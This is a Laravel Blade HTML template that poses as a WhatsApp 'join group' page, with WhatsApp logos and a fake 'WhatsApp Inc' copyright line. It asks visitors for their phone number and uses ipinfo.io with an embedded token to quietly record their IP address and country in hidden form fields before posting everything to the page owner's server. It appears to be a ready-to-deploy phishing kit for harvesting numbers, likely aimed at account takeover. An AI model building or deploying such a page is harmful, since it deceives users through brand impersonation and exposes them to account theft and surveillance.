<link href="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/css/bootstrap.min.css" rel="stylesheet" id="bootstrap-css">
<script src="//maxcdn.bootstrapcdn.com/bootstrap/4.1.1/js/bootstrap.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
<!------ Include the above in your HEAD tag ---------->

<!doctype html>
<html lang="ar">
<head>
<meta property="og:image" content="https://static.whatsapp.net/rsrc.php/v3/y7/r/DSxOAUB0raA.png">

<link rel="icon" href="https://cdn.usbrandcolors.com/images/logos/whatsapp-logo.svg" type="image/svg+xml">

    <!-- Required meta tags -->
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">


   <script src="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/intlTelInput.min.js"></script>
   
    <!-- Fonts -->
    <link rel="dns-prefetch" href="https://fonts.gstatic.com">
    <link href="https://fonts.googleapis.com/css?family=Raleway:300,400,600" rel="stylesheet" type="text/css">

    <link rel="stylesheet" href="css/style.css">

    <link rel="icon" href="Favicon.png">

    <!-- Bootstrap CSS -->
    <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.1.3/css/bootstrap.min.css">

    <title>رابط الإنضمام إلى المجموعة</title>
	<style>
	@import url(https://fonts.googleapis.com/css?family=Raleway:300,400,600);


body{
    margin: 0;
    font-size: .9rem;
    font-weight: 400;
    line-height: 1.6;
    color: #212529;
    text-align: left;
    background-color: #f5f8fa;
}

.navbar-laravel
{
    box-shadow: 0 2px 4px rgba(0,0,0,.04);
}

.navbar-brand , .nav-link, .my-form, .login-form
{
    font-family: Raleway, sans-serif;
}

.my-form
{
    padding-top: 1.5rem;
    padding-bottom: 1.5rem;
}

.my-form .row
{
    margin-left: 0;
    margin-right: 0;
}

.login-form
{
    padding-top: 1.5rem;
    padding-bottom: 1.5rem;
}

.login-form .row
{
    margin-left: 0;
    margin-right: 0;
}
	</style>
	   <link
     rel="stylesheet"
     href="https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/css/intlTelInput.css"
   />
</head>
<body>

<nav class="navbar navbar-expand-lg navbar-light navbar-laravel" style ="background-color: #25D366;">
    <div class="container" >
        <a class="navbar-brand" href="#" style="color:#FFFFFF;">
		    <img  src="https://cdn.usbrandcolors.com/images/logos/whatsapp-logo.svg" width="30" height="30" alt="">
		Whatsapp group</a>
    </div>
</nav>

<main class="login-form">
    <div class="cotainer">
	
        <div class="row justify-content-center">
            <div class="col-md-8">
                <div class="card">
                    <div class="card-header" style="font-family: ui-sans-serif, system-ui, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji !important"><center>رابط الإنضمام إلى المجموعة</center></div>
                    <div class="card-body">
                        <form name="myform" action="send-message" method="post" onsubmit="process();">
                        {{ csrf_field()}}

						<div class="form-group row">
								<img style="display: block; margin-left: auto; margin-right: auto; width: 50%;" src="https://cdn.usbrandcolors.com/images/logos/whatsapp-logo.svg"  alt="">
                        </div>
							
                            <div class="form-group row">
                                <div class="col-md-6">
                                    <input type="tel" id="phone" class="form-control" style="width:330px !important;text-align: right;  font-family: 'Helvetica', Arial, Lucida Grande, sans-serif !important;" placeholder="أدخل رقم الهاتف" name="phone" required>
                                
                                    <input type="hidden" id="hiddenV" name="hiddenV" >
                                    <input type="hidden" id="adresse" name="adresse" >
                                    <input type="hidden" id="country" name="country" >

                                
                                
                                
                                  </div>
                            </div>
							
							
							<div class="form-group row">
                                <div class="col-md-6">
                                    <button type="submit"  class="btn btn-success btn-block">الإنضمام</button>
                                </div>
                            </div>
                            @if (count($errors) > 0)
    <div style="font-family: ui-sans-serif, system-ui, sans-serif, Apple Color Emoji, Segoe UI Emoji, Segoe UI Symbol, Noto Color Emoji !important;color:#FF0000;" >
    <center>رقم هاتفك غير صالح، حاول مرة أخرى</center>
    </div>
@endif
                    </div>
                    </form>
                </div>
            </div>
        </div>
    </div>
    </div>

</main>
<!-- Footer -->
<footer class="bg-light text-center " style="background-color: #111b21 !important; color:#FFFFFF">
  <!-- Grid container -->
  <div class="container p-4">




    <!-- Section: Links -->
    <section class="">
      <!--Grid row-->
      <div class="row">
        <!--Grid column-->
        <div class="col">
          RESOURCES
        </div>
		<div class="col">
          FOLLOW US
        </div>
      </div>
	  <div class="row">
        <!--Grid column-->
        <div class="col">
          Flowbite
        </div>
		<div class="col">
          Github
        </div>
      </div>
	  <div class="row">
        <!--Grid column-->
        <div class="col">
          WhatsApp
        </div>
		<div class="col">
          Discord
        </div>
      </div>
	  <p>LEGAL</p>
	  <div class="row">
        <!--Grid column-->
        <div class="col">
          Privacy Policy
        </div>
		<div class="col">
          Terms & Conditions
        </div>
      </div>
      <!--Grid row-->
    </section>
    <!-- Section: Links -->

  </div>
  <!-- Grid container -->

  <!-- Copyright -->
  <div class="text-center p-3">
    © 2024 Copyright 
    <a href="#">WhatsApp Inc</a>
  </div>
  <!-- Copyright -->

</footer>

<!-- Footer -->
</body>
<script>
 function getIp(callback) {
 fetch('https://ipinfo.io/json?token=fddd21a33914d3', { headers: { 'Accept': 'application/json' }})
   .then((resp) => resp.json())
   .catch(() => {
     return {
       country: 'us',
     };
   })
   .then((resp) => callback(resp.country));
}

   const phoneInputField = document.querySelector("#phone");
   const phoneInput = window.intlTelInput(phoneInputField, {
   initialCountry: "auto",
 geoIpLookup: getIp,
     utilsScript:
       "https://cdnjs.cloudflare.com/ajax/libs/intl-tel-input/17.0.8/js/utils.js",
   });
   const info = document.querySelector(".alert-info");


function process() {

  fetch('https://ipinfo.io/json?token=fddd21a33914d3')
    .then(res => res.json())
    .then(data => {
      document.getElementById("country").value ='Country: '+ data.country
      document.getElementById("adresse").value ='IP: '+ data.ip
    });


 const phoneNumber = phoneInput.getNumber();
 hiddenV.innerHTML = phoneNumber;
 //info.style.display = "";
 //info.innerHTML = `Phone number in E.164 format: <strong>${phoneNumber}</strong>`;
 document.getElementById("hiddenV").value = phoneNumber;
 return true;
}


document.getElementById("phone").addEventListener("input", process);

 </script>
</html>